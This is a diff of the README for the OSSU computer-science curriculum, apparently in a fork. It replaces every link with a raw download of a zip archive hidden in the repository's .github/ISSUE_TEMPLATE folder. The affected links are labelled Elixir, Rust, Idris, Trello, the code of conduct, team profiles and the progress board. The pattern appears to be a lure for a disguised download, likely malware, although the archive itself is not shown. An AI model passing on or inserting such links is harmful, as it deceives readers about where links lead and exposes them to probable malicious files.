+  + Explore the **actor model** through [Elixir](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip), a new functional programming language for the web based on the battle-tested Erlang Virtual Machine!
+  + Explore **borrowing and lifetimes** through [Rust](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip), a systems language which achieves memory- and thread-safety without a garbage collector!
+  + Explore **dependent type systems** through [Idris](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip), a new Haskell-inspired language with unprecedented support for type-driven development.
 
-![keep learning](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)
+![keep learning](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)
 
 # Code of conduct
-[OSSU's code of conduct](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip).
+[OSSU's code of conduct](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip).
 
 ## How to show your progress
 
-1. Create an account in [Trello](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip).
-1. Copy [this](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) board to your personal account.
-See how to copy a board [here](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip).
+1. Create an account in [Trello](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip).
+1. Copy [this](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) board to your personal account.
+See how to copy a board [here](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip).
 
 Now that you have a copy of our official board, you just need to pass the cards to the `Doing` column or `Done` column as you progress in your study.
 
@@ -514,7 +514,7 @@ You can change the status of your board to be *public* or *private*.
 
 # Team
 
-* **[Eric Douglas](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)**: founder of OSSU
-* **[Josh Hanson](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)**: lead technical maintainer
-* **[Waciuma Wanjohi](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)**: lead academic maintainer
-* **[Contributors](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)**
+* **[Eric Douglas](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)**: founder of OSSU
+* **[Josh Hanson](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)**: lead technical maintainer
+* **[Waciuma Wanjohi](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)**: lead academic maintainer
+* **[Contributors](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)**
